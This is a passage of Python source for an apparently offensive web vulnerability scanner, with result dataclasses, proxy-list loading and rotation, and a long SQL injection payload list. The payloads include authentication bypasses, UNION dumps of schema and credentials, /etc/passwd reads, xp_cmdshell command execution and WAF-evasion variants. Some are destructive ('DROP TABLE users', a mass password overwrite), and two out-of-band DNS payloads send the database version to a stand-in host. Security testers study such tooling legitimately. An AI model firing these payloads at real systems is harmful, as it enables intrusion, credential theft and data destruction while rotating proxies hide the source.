    GRAPHQL_ADV  = "GraphQL Advanced"
    API_KEY_LEAK = "API Key Leak"
    TIMING_ATTACK= "Timing Side-Channel"
    CORS_ADV     = "CORS Advanced Bypass"
    CSRF_ADV     = "CSRF Advanced"
    IDOR_ADV     = "IDOR Advanced"
    SEC_HEADERS  = "Security Headers Missing"
    SUBRESOURCE  = "Subresource Integrity Missing"
    POSTMESSAGE  = "postMessage Vulnerability"
    OPEN_REDIRECT2="Advanced Open Redirect"
    HTTP_METHOD  = "Dangerous HTTP Method"
    DNSREBIND    = "DNS Rebinding"


@dataclass
class PayloadItem:
    payload: str
    subtype: str
    impact: str

@dataclass
class ScanResult:
    target: str
    malicious: int
    suspicious: int
    harmless: int
    undetected: int
    total_engines: int
    verdict: Verdict
    error: Optional[str] = None
    scan_type: str = "VirusTotal"

@dataclass
class VulnerabilityResult:
    url: str
    vulnerability_type: VulnerabilityType
    severity: str
    vulnerable_params: List[str] = field(default_factory=list)
    payload_used: Optional[str] = None
    evidence: Optional[str] = None
    details: Optional[str] = None
    subtype: Optional[str] = None
    impact: Optional[str] = None

@dataclass
class ComprehensiveScanResult:
    url: str
    timestamp: str
    virustotal: Optional[ScanResult] = None
    sqli_vulnerabilities:      Optional[List[VulnerabilityResult]] = None
    xss_vulnerabilities:       Optional[List[VulnerabilityResult]] = None
    idor_vulnerabilities:      Optional[List[VulnerabilityResult]] = None
    csrf_vulnerabilities:      Optional[List[VulnerabilityResult]] = None
    rce_vulnerabilities:       Optional[List[VulnerabilityResult]] = None
    lfi_vulnerabilities:       Optional[List[VulnerabilityResult]] = None
    rfi_vulnerabilities:       Optional[List[VulnerabilityResult]] = None
    ssrf_vulnerabilities:      Optional[List[VulnerabilityResult]] = None
    fileupload_vulnerabilities: Optional[List[VulnerabilityResult]] = None
    secmisconf_vulnerabilities: Optional[List[VulnerabilityResult]] = None
    sdt_vulnerabilities:       Optional[List[VulnerabilityResult]] = None
    openredirect_vulnerabilities: Optional[List[VulnerabilityResult]] = None
    cors_vulnerabilities:      Optional[List[VulnerabilityResult]] = None
    hostheader_vulnerabilities: Optional[List[VulnerabilityResult]] = None
    xxe_vulnerabilities:       Optional[List[VulnerabilityResult]] = None
    dirlist_vulnerabilities:   Optional[List[VulnerabilityResult]] = None
    jwt_vulnerabilities:       Optional[List[VulnerabilityResult]] = None
    graphql_vulnerabilities:   Optional[List[VulnerabilityResult]] = None
    prototype_vulnerabilities: Optional[List[VulnerabilityResult]] = None
    crlf_vulnerabilities:      Optional[List[VulnerabilityResult]] = None
    deserial_vulnerabilities:  Optional[List[VulnerabilityResult]] = None
    bizlogic_vulnerabilities:  Optional[List[VulnerabilityResult]] = None
    race_vulnerabilities:      Optional[List[VulnerabilityResult]] = None
    clickjacking_vulnerabilities: Optional[List[VulnerabilityResult]] = None
    sensitive_vulnerabilities:    Optional[List[VulnerabilityResult]] = None
    hpp_vulnerabilities:          Optional[List[VulnerabilityResult]] = None
    enum_vulnerabilities:         Optional[List[VulnerabilityResult]] = None
    mfa_vulnerabilities:          Optional[List[VulnerabilityResult]] = None
    smuggling_vulnerabilities:    Optional[List[VulnerabilityResult]] = None
    ssti_vulns:       Optional[List[VulnerabilityResult]] = None
    nosqli_vulns:     Optional[List[VulnerabilityResult]] = None
    massassign_vulns: Optional[List[VulnerabilityResult]] = None
    jwt_conf_vulns:   Optional[List[VulnerabilityResult]] = None
    cache_vulns:      Optional[List[VulnerabilityResult]] = None
    websocket_vulns:  Optional[List[VulnerabilityResult]] = None
    path_trav_vulns:  Optional[List[VulnerabilityResult]] = None
    api_abuse_vulns:  Optional[List[VulnerabilityResult]] = None
    bopla_vulns:      Optional[List[VulnerabilityResult]] = None
    ldap_vulns:       Optional[List[VulnerabilityResult]] = None
    xml_vulns:        Optional[List[VulnerabilityResult]] = None
    verb_vulns:       Optional[List[VulnerabilityResult]] = None
    shellshock_vulns: Optional[List[VulnerabilityResult]] = None
    log4shell_vulns:  Optional[List[VulnerabilityResult]] = None
    spring_vulns:     Optional[List[VulnerabilityResult]] = None
    ssi_vulns:        Optional[List[VulnerabilityResult]] = None
    csti_vulns:       Optional[List[VulnerabilityResult]] = None
    overall_verdict: Verdict = Verdict.UNKNOWN

class Config:
    def __init__(self):
        self.api_key          = self._load_api_key()
        self.base_url         = "https://www.virustotal.com/api/v3"
        self.timeout          = 30
        self.max_retries      = 3
        self.retry_delay      = 2
        self.rate_limit_delay = 15

        self.vuln_timeout     = 15
        self.payload_delay    = 0.3
        self.max_params_test  = 20
        self.follow_redirects = True
        self.verify_ssl       = False

        # ── New: concurrency / rate control ───────────────────────────────
        self.concurrency      = 10        # max parallel requests
        self.req_delay        = 0.0       # seconds between requests (0 = none)
        self.req_delay_random = False     # randomize delay ±50%

        # ── New: proxy ─────────────────────────────────────────────────────
        self.proxy: Optional[str] = None          # e.g. "http://127.0.0.1:8080"
        self.proxy_list: List[str]   = []          # loaded from proxy file
        self.proxy_file: str         = ""          # path to proxy file
        self.proxy_index: int        = 0           # current active proxy index
        self.proxy_test_url: str     = "http://httpbin.org/ip"  # URL for proxy check
        self.proxy_min_speed: float  = 5.0         # max acceptable latency in seconds

        # ── New: cookies / session ─────────────────────────────────────────
        self.cookies: dict    = {}        # key=value pairs
        self.auth_header: Optional[str] = None  # Authorization header value

        # ── Custom scope headers ──────────────────────────────────────────
        self.custom_request_headers: dict = {}
        self.scope_header_name:  str = ''
        self.scope_header_value: str = ''

        # ── New: authenticated scanning ────────────────────────────────────
        self.login_url: Optional[str]      = None
        self.login_data: dict              = {}   # {field: value}
        self.login_success_pattern: str    = ""   # text in body after login

    def _load_api_key(self) -> str:
        api_key = os.getenv("VT_API_KEY")
        if not api_key:
            config_path = Path("config.json")
            if config_path.exists():
                try:
                    with open(config_path, 'r') as f:
                        config_data = json.load(f)
                        api_key = config_data.get("api_key")
                except Exception:
                    pass
        return api_key

    def build_client_kwargs(self) -> dict:
        """Return kwargs for httpx.AsyncClient based on current config."""
        kw: dict = {"verify": False, "follow_redirects": self.follow_redirects}
        # Use proxy_list rotation if available, else fall back to single proxy
        active_proxy = None
        if self.proxy_list:
            active_proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
        elif self.proxy:
            active_proxy = self.proxy
        if active_proxy:
            kw["proxies"] = active_proxy
        if self.cookies:
            kw["cookies"] = self.cookies
        if self.auth_header:
            kw["headers"] = {"Authorization": self.auth_header}
        return kw

# ══════════════════════════════════════════════════════════════════════════════
#  PROXY MANAGER — Load, Test, Filter, Rotate
#  Reads proxy file → tests each proxy → keeps only fast/working ones
# ══════════════════════════════════════════════════════════════════════════════
class ProxyManager:
    """
    Load proxies from file, test each one, discard slow/dead proxies.
    Supports HTTP / HTTPS / SOCKS5 proxy formats.

    File format (one per line):
        http://1.2.3.4:8080
        https://user:pass@5.6.7.8:3128
        socks5://9.10.11.12:1080
        1.2.3.4:8080             ← auto-prefixed with http://

    Lines starting with # are treated as comments.
    """

    _ANON_CHECK_URL  = "http://httpbin.org/ip"   # returns {"origin":"<ip>"}
    _CONNECT_TIMEOUT = 8   # seconds per proxy test

    def __init__(self, config: "Config", console):
        self.config  = config
        self.console = console

    # ── File loading ──────────────────────────────────────────────────────────
    def load_from_file(self, filepath: str) -> List[str]:
        """
        Parse a proxy file and return a list of normalised proxy URLs.
        """
        proxies: List[str] = []
        try:
            with open(filepath, encoding="utf-8", errors="ignore") as f:
                for raw_line in f:
                    line = raw_line.strip()
                    if not line or line.startswith("#"):
                        continue
                    # Auto-prefix bare IP:PORT entries
                    if line and "://" not in line:
                        line = "http://" + line
                    proxies.append(line)
        except FileNotFoundError:
            self.console.print(f"[red]✗ Proxy file not found: {filepath}[/red]")
        except Exception as e:
            self.console.print(f"[red]✗ Error reading proxy file: {e}[/red]")
        return proxies

    # ── Single proxy test ─────────────────────────────────────────────────────
    async def test_proxy(self, proxy_url: str) -> dict:
        """
        Test a single proxy.  Returns:
        {
            "proxy":   "http://...",
            "ok":      True/False,
            "latency": float (seconds),
            "ip":      "x.x.x.x" or "",
            "reason":  "" or error string,
        }
        """
        result = {"proxy": proxy_url, "ok": False,
                  "latency": 999.0, "ip": "", "reason": ""}
        try:
            t0 = time.monotonic()
            async with httpx.AsyncClient(
                proxies=proxy_url,
                verify=False,
                timeout=self._CONNECT_TIMEOUT,
                follow_redirects=True,
            ) as cl:
                r = await cl.get(self._ANON_CHECK_URL)
                latency = time.monotonic() - t0
                if r.status_code == 200:
                    try:
                        data = r.json()
                        origin = data.get("origin", "")
                    except Exception:
                        origin = ""
                    result.update(ok=True, latency=round(latency, 2), ip=origin)
                else:
                    result["reason"] = f"HTTP {r.status_code}"
        except httpx.ProxyError as e:
            result["reason"] = f"ProxyError: {str(e)[:60]}"
        except (httpx.ConnectTimeout, httpx.ReadTimeout):
            result["reason"] = "Timeout"
        except httpx.ConnectError as e:
            result["reason"] = f"ConnectError: {str(e)[:60]}"
        except Exception as e:
            result["reason"] = f"{type(e).__name__}: {str(e)[:60]}"
        return result

    # ── Batch test + filter ───────────────────────────────────────────────────
    async def test_all(self, proxies: List[str],
                       max_latency: float = 5.0,
                       concurrency: int   = 10) -> List[dict]:
        """
        Test all proxies concurrently.
        Returns list of passing proxy dicts sorted by latency (fastest first).
        """
        sem = asyncio.Semaphore(concurrency)

        async def _test(p: str) -> dict:
            async with sem:
                return await self.test_proxy(p)

        self.console.print(
            f"\n[cyan]⟳ Testing {len(proxies)} proxies "
            f"(max latency {max_latency}s, concurrency {concurrency})...[/cyan]"
        )

        results = []
        with_progress = True
        try:
            from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
            with Progress(
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("{task.completed}/{task.total}"),
                TimeElapsedColumn(),
                console=self.console,
            ) as prog:
                task = prog.add_task("[cyan]Testing proxies...", total=len(proxies))
                tasks = [_test(p) for p in proxies]
                for coro in asyncio.as_completed(tasks):
                    res = await coro
                    results.append(res)
                    prog.advance(task)
        except Exception:
            # Fallback: no progress bar
            results = await asyncio.gather(*[_test(p) for p in proxies])

        # Filter: keep only OK proxies within latency budget
        good   = [r for r in results if r["ok"] and r["latency"] <= max_latency]
        bad    = [r for r in results if not r["ok"] or r["latency"] > max_latency]
        good.sort(key=lambda r: r["latency"])

        # Summary table
        table = Table(title="Proxy Test Results", box=box.ROUNDED)
        table.add_column("Proxy",   style="dim",    width=35, no_wrap=True)
        table.add_column("Status",  justify="center", width=10)
        table.add_column("Latency", justify="right",  width=9)
        table.add_column("IP",      width=16)
        table.add_column("Reason",  style="dim",    width=30)
        for r in sorted(results, key=lambda x: x["latency"]):
            status  = "[green]✓ OK[/green]"  if r["ok"] else "[red]✗ FAIL[/red]"
            latency = f"[green]{r['latency']}s[/green]"                       if r["ok"] and r["latency"] <= max_latency                       else f"[yellow]{r['latency']}s[/yellow]"                       if r["ok"] else "[red]-[/red]"
            table.add_row(r["proxy"][:35], status, latency,
                          r["ip"][:16], r["reason"][:30])
        self.console.print(table)
        self.console.print(
            f"\n[green]✓ {len(good)} working proxies[/green]  "
            f"[red]✗ {len(bad)} dead/slow[/red]"
        )
        return good

    # ── Load + test + apply to config ─────────────────────────────────────────
    async def load_and_apply(self, filepath: str, max_latency: float = 5.0) -> int:
        """
        Load proxies from file, test all, keep good ones, apply to config.
        Returns the count of working proxies.
        """
        raw_list = self.load_from_file(filepath)
        if not raw_list:
            self.console.print("[yellow]⚠ No proxies loaded from file.[/yellow]")
            return 0

        good = await self.test_all(raw_list, max_latency=max_latency)
        if not good:
            self.console.print(
                "[red]✗ No working proxies found. "
                "Scanning will continue without proxy.[/red]"
            )
            return 0

        # Apply to config
        self.config.proxy_list  = [r["proxy"] for r in good]
        self.config.proxy_file  = filepath
        self.config.proxy_index = 0
        # Also set active proxy to fastest
        self.config.proxy       = self.config.proxy_list[0]
        self.console.print(
            f"[green]✓ {len(self.config.proxy_list)} proxies active. "
            f"Fastest: {self.config.proxy_list[0]}[/green]"
        )
        return len(self.config.proxy_list)

    # ── Rotate to next proxy ───────────────────────────────────────────────────
    def rotate(self) -> Optional[str]:
        """Advance to next proxy in rotation. Returns the new active proxy."""
        if not self.config.proxy_list:
            return None
        self.config.proxy_index = (self.config.proxy_index + 1) % len(self.config.proxy_list)
        self.config.proxy       = self.config.proxy_list[self.config.proxy_index]
        return self.config.proxy

    # ── Stats ──────────────────────────────────────────────────────────────────
    def status_line(self) -> str:
        if not self.config.proxy_list:
            return "No proxy list loaded"
        cur = self.config.proxy_index % len(self.config.proxy_list)
        return (f"{len(self.config.proxy_list)} proxies active | "
                f"Current [{cur+1}/{len(self.config.proxy_list)}]: "
                f"{self.config.proxy_list[cur]}")


class SQLInjectionScanner:
    """Advanced SQL Injection vulnerability scanner"""

    def __init__(self, config: Config):
        self.config = config

        self.sqli_payloads = [
            # Classic payloads (original)
            PayloadItem("'", "Error-based", "Reveals database type and confirms SQL injection vulnerability via error messages"),
            PayloadItem('"', "Error-based", "Triggers SQL errors in double-quote string context"),
            PayloadItem("' OR '1'='1", "Auth Bypass", "Bypass login without password"),
            PayloadItem("' OR '1'='1' --", "Auth Bypass", "Bypasses authentication and comments out the rest of the query"),
            PayloadItem("' OR '1'='1' /*", "Auth Bypass", "Bypasses authentication using block comment syntax"),
            PayloadItem('" OR "1"="1', "Auth Bypass", "Auth bypass in double-quote context"),
            PayloadItem('" OR "1"="1" --', "Auth Bypass", "Auth bypass with comment — double-quote"),
            PayloadItem("' OR 1=1--", "Auth Bypass", "Bypasses authentication using always-true numeric comparison"),
            PayloadItem('" OR 1=1--', "Auth Bypass", "Auth bypass in double-quote context"),
            PayloadItem("1' OR '1'='1", "Auth Bypass", "Auth bypass with numeric prefix"),
            PayloadItem('1" OR "1"="1', "Auth Bypass", "Auth bypass — double-quote with numeric prefix"),
            PayloadItem("' UNION SELECT NULL--", "UNION-based", "Determines column count — first step toward data exfiltration"),
            PayloadItem("' UNION SELECT NULL,NULL--", "UNION-based", "Determines column count (2 columns)"),
            PayloadItem("' UNION SELECT NULL,NULL,NULL--", "UNION-based", "Determines column count (3 columns)"),
            PayloadItem("' AND SLEEP(5)--", "Time-based Blind", "Confirm injection via intentional delay — MySQL"),
            PayloadItem("' AND BENCHMARK(5000000,MD5('A'))--", "Time-based Blind", "Delay via CPU-intensive operations — MySQL (BENCHMARK)"),
            PayloadItem("'; WAITFOR DELAY '00:00:05'--", "Time-based Blind", "Intentional delay — MSSQL Server (WAITFOR DELAY)"),
            PayloadItem("' AND '1'='1", "Boolean Blind", "True condition — allows blind data extraction without triggering errors"),
            PayloadItem("' AND '1'='2", "Boolean Blind", "False condition — used to compare response differences for blind injection"),
            PayloadItem("1 AND 1=1", "Boolean Blind", "True condition in numeric parameter context"),
            PayloadItem("1 AND 1=2", "Boolean Blind", "False condition — used to compare response differences for blind injection"),
            PayloadItem("1 OR 1=1", "Boolean Blind", "True OR condition in numeric context"),
            PayloadItem("1 OR 1=2", "Boolean Blind", "False OR condition for comparison"),
            PayloadItem("-1 OR 1=1", "Boolean Blind", "True condition with negative ID"),
            PayloadItem("'; DROP TABLE users--", "Stacked Queries", "Executes stacked query — drops database tables (destructive)"),
            PayloadItem("1; SELECT * FROM users--", "Stacked Queries", "Reads the users table — exposes sensitive credentials"),

            # Extended payloads
            PayloadItem("' OR 'x'='x", "Auth Bypass", "Bypass filters using uncommon variable"),
            PayloadItem("') OR ('1'='1", "Auth Bypass", "Bypasses authentication in parenthesis-wrapped query context"),
            PayloadItem("' OR 1=1#", "Auth Bypass", "Auth bypass with hash comment — MySQL"),
            PayloadItem("admin'--", "Auth Bypass", "Logs in as admin account without a password"),
            PayloadItem("admin' #", "Auth Bypass", "Logs in as admin using MySQL hash comment to ignore password check"),
            PayloadItem("' OR 'unusual'='unusual", "Auth Bypass", "Bypasses filters that block common OR/1=1 patterns"),
            PayloadItem("' OR username IS NOT NULL--", "Auth Bypass", "Authenticates by verifying any user record exists"),
            PayloadItem("' UNION SELECT NULL,NULL,NULL,NULL--", "UNION-based", "Determines column count (4 columns)"),
            PayloadItem("' UNION ALL SELECT NULL--", "UNION-based", "Bypasses DISTINCT filters using UNION ALL"),
            PayloadItem("' UNION SELECT 1,2,3--", "UNION-based", "Identifies which columns are reflected in the response for data extraction"),
            PayloadItem("' UNION SELECT LOAD_FILE('/etc/passwd')--", "UNION-based", "Reads server files — exposes system data like /etc/passwd"),
            PayloadItem("1' AND 1=1--", "Boolean Blind", "True condition with string termination"),
            PayloadItem("1' AND 1=2--", "Boolean Blind", "False condition — confirms vulnerability by showing different response"),
            PayloadItem("1) AND 1=1--", "Boolean Blind", "True condition in parenthesis context"),
            PayloadItem("1) AND 1=2--", "Boolean Blind", "False condition in parenthesis context"),
            PayloadItem("' AND SUBSTRING(version(),1,1)='5", "Boolean Blind", "Extracts DB version character by character via boolean responses"),
            PayloadItem("' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "Boolean Blind", "Enumerates DB tables — reveals full database schema structure"),
            PayloadItem("' OR SLEEP(5)--", "Time-based Blind", "Confirm injection in OR context — MySQL"),
            PayloadItem("'; SELECT pg_sleep(5)--", "Time-based Blind", "Intentional delay — PostgreSQL (pg_sleep)"),
            PayloadItem("'; SELECT version()--", "Stacked Queries", "Execute stacked queries — extract DB version"),
            PayloadItem("'; SELECT user()--", "Stacked Queries", "Reveals DB user identity and privileges"),
            PayloadItem("'; SELECT database()--", "Stacked Queries", "Reveals current database name"),
            PayloadItem("1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "Error-based", "Extract DB version from error message — MySQL"),
            PayloadItem("1 AND UPDATEXML(1,CONCAT(0x7e,version()),1)--", "Error-based", "Extracts DB version via XML error — MySQL (UPDATEXML)"),
            PayloadItem("' AND 1=CAST((SELECT version()) AS INT)--", "Error-based", "Extracts DB version via type cast error — PostgreSQL"),
            PayloadItem("%27 OR %271%27=%271", "Filter Bypass", "Bypasses URL encoding filters"),
            PayloadItem("'/**/OR/**/1=1--", "Filter Bypass", "Bypasses whitespace filters using inline SQL comments"),
            PayloadItem("' /*!OR*/ 1=1--", "Filter Bypass", "Bypasses some WAFs using MySQL conditional comment syntax"),
            PayloadItem("' OR 0x313d31--", "Filter Bypass", "Bypasses filters using hex-encoded values"),

            # ── WAF / obfuscation bypasses ────────────────────────────────────
            PayloadItem("'%09OR%091=1--",             "WAF Bypass - Tab",       "Tab character instead of space bypasses many WAFs"),
            PayloadItem("'%0aOR%0a1=1--",             "WAF Bypass - Newline",   "Newline instead of space"),
            PayloadItem("'%0dOR%0d1=1--",             "WAF Bypass - CR",        "Carriage return instead of space"),
            PayloadItem("' OR/**/ 1=1--",             "WAF Bypass - Comment",   "Comment between keywords"),
            PayloadItem("1' /*!50000AND*/ 1=1--",     "WAF Bypass - MySQL Ver", "MySQL version-specific conditional comment"),
            PayloadItem("' OR 1 LIKE 1--",            "WAF Bypass - LIKE",      "LIKE instead of = to bypass keyword filters"),
            PayloadItem("' OR 2 BETWEEN 1 AND 3--",   "WAF Bypass - BETWEEN",   "BETWEEN operator bypass"),
            PayloadItem("' OR 1 IN (1)--",            "WAF Bypass - IN",        "IN operator bypass"),

            # ── UNION column discovery ─────────────────────────────────────────
            PayloadItem("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "UNION-based", "5-column UNION test"),
            PayloadItem("' UNION SELECT 1,2,3,4--",   "UNION-based",  "4-column UNION — identifies reflected columns"),
            PayloadItem("' UNION SELECT 1,2,3,4,5--", "UNION-based",  "5-column UNION"),
            PayloadItem("' UNION SELECT user(),2--",  "UNION-based",  "Extracts current DB user"),
            PayloadItem("' UNION SELECT version(),2--","UNION-based", "Extracts DB version"),
            PayloadItem("' UNION SELECT database(),2--","UNION-based","Extracts current DB name"),
            PayloadItem("' UNION SELECT @@hostname,2--","UNION-based","Extracts server hostname"),
            PayloadItem("' UNION SELECT table_name,2 FROM information_schema.tables LIMIT 1--",
                        "UNION-based", "Extracts first table name from schema"),

            # ── Time-based variants (different DBs) ───────────────────────────
            PayloadItem("1; WAITFOR DELAY '0:0:5'--",              "Time-based MSSQL", "MSSQL delay via parameter injection"),
            PayloadItem("1)); SELECT SLEEP(5)--",                   "Time-based MySQL", "Double paren escape + SLEEP"),
            PayloadItem("'; SELECT SLEEP(5) AND '1'='1",           "Time-based MySQL", "SLEEP in string context"),
            PayloadItem("1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "Time-based MySQL", "Subquery SLEEP bypass"),
            PayloadItem("'; PERFORM pg_sleep(5)--",                 "Time-based PgSQL", "PostgreSQL PERFORM pg_sleep"),
            PayloadItem("'; SELECT 1 FROM pg_sleep(5)--",           "Time-based PgSQL", "pg_sleep in SELECT"),

            # ── Error-based (more DBs) ────────────────────────────────────────
            PayloadItem("' AND GTID_SUBSET(CONCAT(0x7e,version()),1)--","Error-based MySQL","GTID_SUBSET error extraction"),
            PayloadItem("' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--",
                        "Error-based MySQL", "JSON_KEYS error extraction"),
            PayloadItem("' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
                        "Error-based MSSQL", "MSSQL table name via type conversion error"),
            PayloadItem("' AND 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                        "Error-based MySQL", "FLOOR+RAND duplicate key error extraction"),

            # ── Second-order / JSON / NoSQL-style ────────────────────────────
            PayloadItem("1; SELECT 1--",              "Stacked Query",    "Minimal stacked query test"),
            PayloadItem("' OR 1=1 LIMIT 1--",         "Auth Bypass",      "LIMIT clause bypass"),
            PayloadItem("' GROUP BY 1--",             "Error-based",      "GROUP BY clause — may trigger column error"),
            PayloadItem("' ORDER BY 1--",             "Error-based",      "ORDER BY column count discovery"),
            PayloadItem("' ORDER BY 2--",             "Error-based",      "ORDER BY 2 — errors if fewer than 2 columns"),
            PayloadItem("' ORDER BY 3--",             "Error-based",      "ORDER BY 3 — errors if fewer than 3 columns"),
            PayloadItem("' ORDER BY 10--",            "Error-based",      "ORDER BY 10 — large number to force error"),

            # ── JSON / NoSQL context injection ────────────────────────────────
            PayloadItem("' OR '1'='1' LIMIT 1 OFFSET 0--", "Auth Bypass", "LIMIT+OFFSET bypass for paginated queries"),
            PayloadItem("' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--",
                        "UNION-based", "Dump all table names in single request"),
            PayloadItem("' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=0x7573657273--",
                        "UNION-based", "Dump columns of 'users' table using hex-encoded name"),
            PayloadItem("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--",
                        "Error-based MySQL", "DB name via duplicate-key error"),
            PayloadItem("'; EXEC xp_cmdshell('ping 127.0.0.1')--",
                        "Stacked - MSSQL RCE", "Execute OS command via xp_cmdshell — MSSQL"),
            PayloadItem("'; EXEC sp_makewebtask '\\\\127.0.0.1\\share\\out.txt','SELECT 1'--",
                        "Stacked - MSSQL File", "Write to UNC path via sp_makewebtask — MSSQL"),
            PayloadItem("' UNION SELECT NULL,@@version,NULL--",
                        "UNION-based", "Extract exact DB version string"),
            PayloadItem("' UNION SELECT NULL,user(),NULL--",
                        "UNION-based", "Extract current DB user"),
            PayloadItem("' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata LIMIT 1--",
                        "UNION-based", "Enumerate all database names"),
            # ── ClickHouse / non-standard ─────────────────────────────────────
            PayloadItem("' OR 1=1 FORMAT JSON--",
                        "ClickHouse bypass", "ClickHouse-style format injection"),
            # ── Cassandra / MongoDB-style (parameter interpreted as eval) ──────
            PayloadItem("';sleep(5000)//",
                        "NoSQL JS injection", "MongoDB $where JS sleep injection"),
            PayloadItem("'||sleep(5)#",
                        "NoSQL sleep",        "MySQL sleep via OR pipe"),
            # ── OOB (Out-of-Band) via DNS ─────────────────────────────────────
            PayloadItem("' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.y2s.example.com\\\\a'))--",
                        "OOB DNS MySQL",      "Trigger OOB DNS lookup carrying DB version"),
            PayloadItem("'; DECLARE @q NVARCHAR(100)='\\\\'+@@version+'.y2s.example.com\\a'; EXEC master..xp_dirtree @q--",
                        "OOB DNS MSSQL",      "Trigger OOB DNS via xp_dirtree — MSSQL"),
            # ── WAF Evasion variants ───────────────────────────────────────────
            PayloadItem("'/**/OR/**/1=1--",       "WAF Evasion",  "Comment-padded OR — bypasses space filters"),
            PayloadItem("'%09OR%091=1--",          "WAF Evasion",  "Tab-encoded spaces — evades WAF keyword detection"),
            PayloadItem("'%0aOR%0a1=1--",          "WAF Evasion",  "Newline-encoded spaces"),
            PayloadItem("'/*!OR*/1=1--",            "WAF Evasion",  "MySQL inline comment bypass"),
            PayloadItem("' OR 0x313d31--",          "WAF Evasion",  "Hex-encoded true condition"),
            PayloadItem("' oR '1'='1",              "WAF Evasion",  "Mixed-case keyword — evades case-sensitive WAF"),
            PayloadItem("';%00",                    "WAF Evasion",  "Null-byte termination — truncates query"),
            PayloadItem("' OR 1=1 LIMIT 1--",       "WAF Evasion",  "LIMIT 1 to reduce row leakage noise"),
            PayloadItem("'/*!50000OR*/1=1--",       "WAF Evasion",  "MySQL version conditional comment bypass"),
            PayloadItem("' /*!AND*/ 1=1--",         "WAF Evasion",  "AND with version comment"),
            PayloadItem("' UNION%20SELECT%20NULL--","WAF Evasion",  "URL-encoded space in UNION"),
            PayloadItem("' UNION%0aSELECT%0aNULL--","WAF Evasion", "Newline in UNION SELECT"),
            # ── Additional WAF evasion (unique) ──────────────────────────────
            PayloadItem("' OR 'x'='x",            "WAF Evasion", "Alternate true condition — bypasses '1'='1' filters"),
            PayloadItem("' OR 2>1--",             "WAF Evasion", "Numeric comparison — bypasses equality filters"),
            PayloadItem("'/*! OR */1=1--",        "WAF Evasion", "Spaced conditional comment OR"),
            PayloadItem("'+OR+1=1--",             "WAF Evasion", "Plus-encoded spaces (query string context)"),
            PayloadItem("'%20OR%201=1--",         "WAF Evasion", "Percent-20 space encoding"),
            # ── PostgreSQL ────────────────────────────────────────────────────
            PayloadItem("'; SELECT pg_sleep(5)-- -",                "Time PostgreSQL", "PG sleep"),
            PayloadItem("' UNION SELECT NULL FROM DUAL--",           "Oracle UNION",   "Oracle dual"),
            PayloadItem("' UNION SELECT banner FROM v$version--",    "Oracle Version", "v$version"),
            # ── MySQL extract ─────────────────────────────────────────────────
            PayloadItem("' AND EXTRACTVALUE(1337,CONCAT(0x7e,database()))--",  "Error MySQL", "EXTRACTVALUE db"),
            PayloadItem("' AND UPDATEXML(1337,CONCAT(0x7e,user()),1)--",       "Error MySQL", "UPDATEXML user"),
            PayloadItem("' UNION SELECT NULL,load_file('/etc/passwd'),3--",    "MySQL File Read", "load_file"),
            PayloadItem("'; EXEC master..xp_cmdshell 'whoami'--",             "MSSQL RCE", "xp_cmdshell"),
            PayloadItem("' UNION SELECT name FROM master..sysdatabases--",    "MSSQL Enum", "sysdatabases"),
            # ── Second-order ──────────────────────────────────────────────────
            PayloadItem("admin'--",                "Second-order",  "Username comment for second-order"),
            PayloadItem("1; UPDATE users SET password='hacked' WHERE 1=1--",  "Stacked Update", "Mass update"),
            # ── SQLite-specific ───────────────────────────────────────────────
            PayloadItem("' UNION SELECT sqlite_version()--",           "SQLite Version",   "Extract SQLite version"),
            PayloadItem("' UNION SELECT name FROM sqlite_master WHERE type='table'--", "SQLite Table Enum", "Enumerate tables"),
            PayloadItem("' AND 1=1--",                                 "Boolean True",     "Boolean-based positive test"),
            PayloadItem("' AND 1=2--",                                 "Boolean False",    "Boolean-based false test — response should differ"),
            PayloadItem("' AND SUBSTR(version(),1,1)='5'--",           "Boolean Blind DB", "Blind check: MySQL v5 first char"),
            PayloadItem("' AND ASCII(SUBSTR(database(),1,1))>64--",    "Boolean Blind DB", "Blind ASCII comparison on db name"),
            # ── Inline comment variants ───────────────────────────────────────
            PayloadItem("'/*comment*/OR/*comment*/1=1--",              "WAF Evasion",      "Inline comment fragmentation around OR"),
            PayloadItem("' OR/**/ 1=1--",                              "WAF Evasion",      "Comment between OR and value"),
            PayloadItem("'\tor\t'1'='1",                               "WAF Evasion",      "Tab characters instead of spaces"),
            # ── JSON context ──────────────────────────────────────────────────
            PayloadItem('{"id": "1 OR 1=1"}',                         "JSON SQLi",        "SQL injection inside JSON body parameter"),
            PayloadItem('{"id": 1, "$gt": 0}',                        "NoSQL in JSON",    "NoSQL-style injection in JSON — MongoDB"),
            # ── GraphQL context ───────────────────────────────────────────────
            PayloadItem("' UNION SELECT 1,2,3-- -",                    "UNION 3-col",      "UNION with 3 columns — common table width"),
            PayloadItem("' UNION SELECT 1,2,3,4-- -",                  "UNION 4-col",      "UNION with 4 columns"),
            PayloadItem("' UNION SELECT 1,2,3,4,5-- -",                "UNION 5-col",      "UNION with 5 columns"),
            # ── Hybrid: boolean + time ────────────────────────────────────────
            PayloadItem("' AND (SELECT 1 WHERE SLEEP(3)=0)--",         "Hybrid Time",      "Time-based inside boolean wrapper"),
            PayloadItem("' AND IF(1=1,SLEEP(3),0)--",                  "MySQL IF Sleep",   "Conditional sleep — MySQL IF()"),
            PayloadItem("' AND IF(1=2,SLEEP(3),0)--",                  "MySQL IF NoSleep", "False branch — should NOT delay (baseline pair)"),
        ]

        self.sql_errors = [
            # MySQL
            "you have an error in your sql syntax",
            "warning: mysql",
            r"sql syntax.*?mysql",
            r"warning.*?\Wmysqli?_",
            "valid mysql result",
            r"mysqlclient\.",
